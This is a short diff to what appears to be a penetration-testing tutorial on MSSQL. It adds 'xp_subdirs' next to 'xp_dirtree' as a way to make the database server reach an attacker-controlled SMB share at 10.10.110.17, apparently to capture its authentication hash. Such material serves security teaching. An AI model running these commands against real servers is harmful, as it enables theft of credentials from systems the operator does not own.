@@ -15,3 +15,7 @@ When we use one of these stored procedures and point it to our SMB server, the d
 ```cmd-session
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
 ```
+or
+```cmd-session
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+```
